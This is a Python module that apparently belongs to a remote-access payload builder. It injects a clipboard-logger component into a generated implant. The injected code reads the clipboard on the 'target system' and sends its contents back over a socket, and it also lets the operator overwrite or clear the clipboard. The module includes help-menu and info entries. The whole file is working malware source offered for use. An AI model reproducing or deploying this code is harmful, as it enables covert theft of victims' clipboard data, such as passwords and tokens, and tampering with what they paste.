# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('import pyperclip')
        self.config.functions.append('''
def clip_logger(option):
    flag = option.split(' ',1)
    if flag[0] == 'clip_dump':
        send_all(s,'[+]Got clipboard data : \\n' + pyperclip.paste())
    elif flag[0] == 'clip_set':
        pyperclip.copy(flag[1])
        send_all(s,'[+]Set clipboard text to : ' + flag[1])
    elif flag[0] == 'clip_clear':
        pyperclip.copy('')
        send_all(s,'[+]Cleared clipboard')''')
        self.config.logics.append('''
            elif command in ('clip_dump', 'clip_set', 'clip_clear'):
                clip_logger(data)''')
        self.config.help_menu['clip_dump'] = 'Display contents of clipboard on the target system'
        self.config.help_menu['clip_set <text to set clipboard to>'] = 'Set the value of the clipboard on the target system'
        self.config.help_menu['clip_clear'] = 'Clear the clipboard data on the target system'
    elif option == 'info':
        self.log.blank('\nName             : Clipboard logger component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : pyperclip (External), xclip utility for Linux (Non python external dependency, target system needs to have this as well)' \
                       '\nCommands         : clip_set <text to set clipboard to>, clip_dump, clip_clear' \
                       '\nDescription      : Allows for control over the clipboard, set, read or clear the clipboard data\n')
        return {
            "Name": "Clipboard logger component",
            "OS": "Linux",
            "Required Modules": "pyperclip (External), xclip utility for Linux (Non python external dependency, target system needs to have this as well",
            "Commands": "clip_set <text to set clipboard to>, clip_dump, clip_clear",
            "Description": "Allows for control over the clipboard, set, read or clear the clipboard data"
        }